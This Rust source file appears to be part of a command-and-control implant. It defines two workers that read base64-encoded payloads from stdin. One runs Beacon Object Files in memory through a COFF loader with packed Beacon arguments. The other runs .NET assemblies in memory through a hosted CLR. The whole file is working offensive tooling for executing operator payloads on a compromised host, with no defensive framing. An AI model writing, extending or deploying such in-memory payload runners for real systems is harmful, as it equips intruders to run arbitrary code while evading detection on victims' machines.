use std::io::Read;
use serde_json::Value;
use base64::engine::general_purpose;
use base64::Engine;
use coffeeldr::{CoffeeLdr, BeaconPack};
use clroxide::clr::Clr;

pub fn run_bof_worker() {
    let mut input = String::new();
    std::io::stdin().read_to_string(&mut input).expect("worker: failed to read stdin");

    let data: Value = serde_json::from_str(&input).expect("worker: failed to parse input");
    let file_bytes = general_purpose::STANDARD
        .decode(data["file_bytes"].as_str().expect("worker: missing file_bytes"))
        .expect("worker: failed to decode file_bytes");
    let params_str = data["parameters"].as_str().unwrap_or("").trim().to_string();

    let mut output = String::new();

    match CoffeeLdr::new(file_bytes.as_slice()) {
        Ok(mut ldr) => {
            output.push_str("COFF loaded!\n");

            if params_str.is_empty() {
                match ldr.run("go", None, None) {
                    Ok(res) => output.push_str(&res),
                    Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                }
            } else {
                let mut pack = BeaconPack::default();

                for arg in params_str.split_whitespace() {
                    if let Err(e) = pack.addstr(arg) {
                        output.push_str(&format!("Arg error ({}): {}\n", arg, e));
                    }
                }

                match pack.get_buffer_hex() {
                    Ok(buf) => {
                        let ptr = buf.as_ptr() as *mut u8;
                        let len = buf.len();

                        match ldr.run("go", Some(ptr), Some(len)) {
                            Ok(res) => output.push_str(&res),
                            Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                        }

                        std::mem::forget(buf);
                    }
                    Err(e) => {
                        output.push_str(&format!("Pack error: {}\n", e));
                    }
                }
            }
        }
        Err(e) => output.push_str(&format!("Load error: {:?}\n", e)),
    }

    print!("{}", output);
}

pub fn run_dot_worker() {
    let mut input = String::new();
    std::io::stdin().read_to_string(&mut input).expect("worker: failed to read stdin");

    let data: Value = serde_json::from_str(&input).expect("worker: failed to parse input");
    let file_bytes = general_purpose::STANDARD
        .decode(data["file_bytes"].as_str().expect("worker: missing file_bytes"))
        .expect("worker: failed to decode file_bytes");
    let params_str = data["parameters"].as_str().unwrap_or("");
    let args: Vec<String> = params_str.split_whitespace().map(|s| s.to_string()).collect();

    match Clr::new(file_bytes, args) {
        Ok(mut clr) => match clr.run() {
            Ok(output) => print!("{}", output),
            Err(e) => {
                eprint!("DOT execution error: {:?}", e);
                std::process::exit(1);
            }
        },
        Err(e) => {
            eprint!("DOT load error: {:?}", e);
            std::process::exit(1);
        }
    }
}
